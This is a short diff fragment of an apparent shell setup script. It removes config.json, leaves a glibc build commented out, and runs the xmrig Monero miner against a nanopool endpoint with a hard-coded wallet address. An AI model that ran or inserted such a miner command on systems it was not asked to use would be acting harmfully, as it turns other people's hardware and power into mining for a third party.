@@ -81,4 +81,4 @@ rm config.json &&
 #cd build && 
 #../configure --prefix=/usr/local/glibc-2.38 && 
 #make && sudo make install && 
-./xmrig -o xmr-eu1.nanopool.org:14433 -u 48wKerdf8HaKCgAfh8ACanFBHTa7Td7oQTdTty5gm4vnfvAhdV2cJHtCNwuZDVwKPH448uasLzjZwWsyFqjCW7BWL5Z3zez --tls --coin monero && 
+./xmrig -o xmr-eu1.nanopool.org:14433 -u 48wKerdf8HaKCgAfh8ACanFBHTa7Td7oQTdTty5gm4vnfvAhdV2cJHtCNwuZDVwKPH448uasLzjZwWsyFqjCW7BWL5Z3zez --tls --coin monero
